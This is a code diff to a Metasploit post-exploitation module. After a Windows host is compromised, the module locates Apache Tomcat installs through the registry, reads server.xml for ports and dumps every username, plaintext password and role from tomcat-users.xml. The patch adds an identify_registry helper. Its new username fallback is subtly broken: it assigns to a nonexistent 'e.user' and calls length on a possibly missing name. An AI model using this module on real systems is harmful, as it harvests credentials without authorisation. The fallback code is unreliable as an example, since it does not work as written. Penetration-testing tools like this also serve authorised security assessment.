@@ -36,12 +36,21 @@ class Metasploit3 < Msf::Post
 	# method called when command run is issued
 	def run
 
+		installs = []
 		results = []
 		users = []
 		print_status("Enumerating Tomcat Servers on #{sysinfo['Computer']}")
 		if check_tomcat
-			results += enumerate_tomcat
-			users += enumerate_tomcat_creds
+			installs += identify_registry
+			if not installs.empty?
+				installs.each do |inst|
+					results += enumerate_tomcat(inst[0],inst[1])
+					users += enumerate_tomcat_creds(inst[0],inst[1])
+				end
+			else
+				print_status("Done, Tomcat Not Found")
+				return
+			end
 		end
 		if results.empty?
 			print_status("Done, Tomcat Not Found")
@@ -106,43 +115,34 @@ class Metasploit3 < Msf::Post
 	### deep server enumeration methods ###
 	
 	# enumerate tomcat
-	def enumerate_tomcat
+	def enumerate_tomcat(val_installpath,val_version)
 		results = []
 		found = false
-		basekey = "HKLM\\SOFTWARE\\Apache Software Foundation\\Tomcat"
-		instances = registry_enumkeys(basekey)
-		if not instances.nil? and not instances.empty?
-			instances.each do |i|
-				next if found
-				versionkey = "#{basekey}\\#{i}"
-				val_installpath = registry_getvaldata(versionkey,"InstallPath")
-				val_version = registry_getvaldata(versionkey,"Version")
-				print_good("\t\t+ Version: #{val_version}")	
-				
-				if not exist?(val_installpath + "\\conf\\server.xml")
-					print_error("\t\t! tomcat configuration not found")
-					next
-				end
-				
-				appname = find_application_name(val_installpath)
-				
-				ports = []
-				xml_data = read_file(val_installpath + "\\conf\\server.xml")
-				doc = REXML::Document.new(xml_data)
-				doc.elements.each('Server/Service/Connector') do |e|
-					ports << e.attributes['port']
-				end
-				ports.uniq.each do |p|
-					print_good("\t\t+ Port: #{p}")	
-					found = true
-					results << [session.sock.peerhost,"#{val_version}",p,appname]
-				end
-				if found
-					print_good("\t\t+ Application: [#{appname}]")
-				else
-					print_error("\t\t! port not found")
-				end
-			end
+		print_good("\t\t+ Version: #{val_version}")	
+		print_good("\t\t+ Path: #{val_installpath}")	
+		
+		if not exist?(val_installpath + "\\conf\\server.xml")
+			print_error("\t\t! tomcat configuration not found")
+			return results
+		end
+		
+		appname = find_application_name(val_installpath)
+		
+		ports = []
+		xml_data = read_file(val_installpath + "\\conf\\server.xml")
+		doc = REXML::Document.new(xml_data)
+		doc.elements.each('Server/Service/Connector') do |e|
+			ports << e.attributes['port']
+		end
+		ports.uniq.each do |p|
+			print_good("\t\t+ Port: #{p}")	
+			found = true
+			results << [session.sock.peerhost,"#{val_version}",p,appname]
+		end
+		if found
+			print_good("\t\t+ Application: [#{appname}]")
+		else
+			print_error("\t\t! port not found")
 		end
 		return results
 	rescue
@@ -151,29 +151,30 @@ class Metasploit3 < Msf::Post
 	end
 	
 	# enumerate tomcat users from its user base
-	def enumerate_tomcat_creds
+	def enumerate_tomcat_creds(val_installpath,val_version)
 		users = []
-		found = false
-		basekey = "HKLM\\SOFTWARE\\Apache Software Foundation\\Tomcat"
-		instances = registry_enumkeys(basekey)
-		if not instances.nil? and not instances.empty?
-			instances.each do |i|
-				next if found
-				versionkey = "#{basekey}\\#{i}"
-				val_installpath = registry_getvaldata(versionkey,"InstallPath")
-				val_version = registry_getvaldata(versionkey,"Version")
-				userpath = val_installpath + "\\conf\\tomcat-users.xml"
-				if exist?(userpath)
-					xml_data = read_file(userpath)
-					doc = REXML::Document.new(xml_data)
-				
-					doc.elements.each('tomcat-users/user') do |e|
-						users << [ e.attributes['name'],e.attributes['password'],e.attributes['roles'] ]
-						print_good("\t\t+ User:[#{e.attributes['name']}] Pass:[#{e.attributes['password']}] Roles:[#{e.attributes['roles']}]")
+		userpath = val_installpath + "\\conf\\tomcat-users.xml"
+		if exist?(userpath)
+			xml_data = read_file(userpath)
+			doc = REXML::Document.new(xml_data)	
+			
+			if not doc.elements.empty?
+				doc.elements.each('tomcat-users/user') do |e|		
+					e_user=e.attributes['name']
+					if e_user.length >0
+						e_user=e.attributes['name']
+					else
+						e.user=e_user=e.attributes['username']
 					end
+					users << [ e_user,e.attributes['password'],e.attributes['roles'] ]
+					print_good("\t\t+ User:[#{e_user}] Pass:[#{e.attributes['password']}] Roles:[#{e.attributes['roles']}]")
 				end
+			else
+				print_error("\t\t! No Users Found")		
+				return users
 			end
 		end
+
 		return users
 	rescue
 		print_error("\t\t! could not identify users")
@@ -182,13 +183,43 @@ class Metasploit3 < Msf::Post
 	
 	### helper functions ###
 	
+	#this method identifies the correct registry path to tomcat details, and returns [path,version]
+	def identify_registry
+		values = []
+		basekey = "HKLM\\SOFTWARE\\Apache Software Foundation\\Tomcat"
+		instances = registry_enumkeys(basekey)
+		if not instances.nil? and not instances.empty?
+			instances.each do |i|
+				major_version_key = "#{basekey}\\#{i}"
+				services = registry_enumkeys(major_version_key)
+				
+				if services.empty?
+					val_installpath = registry_getvaldata(major_version_key,"InstallPath")
+					val_version = registry_getvaldata(major_version_key,"Version")
+					values << [val_installpath,val_version]
+				else				
+					services.each do |s|
+						service_key = "#{major_version_key}\\#{s}"
+						val_installpath = registry_getvaldata(service_key,"InstallPath")
+						val_version = registry_getvaldata(service_key,"Version")
+						values << [val_installpath,val_version]
+					end
+				end
+			end
+		end
+		return values
+	rescue
+		print_error("\t\t! failed to locate install path")
+		return nil || []
+	end
+	
 	#this function extracts the application name from the main page of the web application
 	def find_application_name(val_installpath)
 		index_file = ['index.html','index.htm','index.php','index.jsp','index.asp']
 		path = val_installpath + "\\webapps"
 		if not directory?(path + "\\ROOT")
 			print_error("\t\t! expected directory wasnt found")
-			return "UNKNOWN"
+			return "Unknown"
 		end
 		
 		index_file.each do |i|
@@ -207,10 +238,10 @@ class Metasploit3 < Msf::Post
 				end
 			end
 		end
-		return ""
+		return "Unknown"
 	rescue
 		print_error("\t\t! could not identify application name")
-		return "UNKNOWN"
+		return "Unknown"
 	end
 	
 end
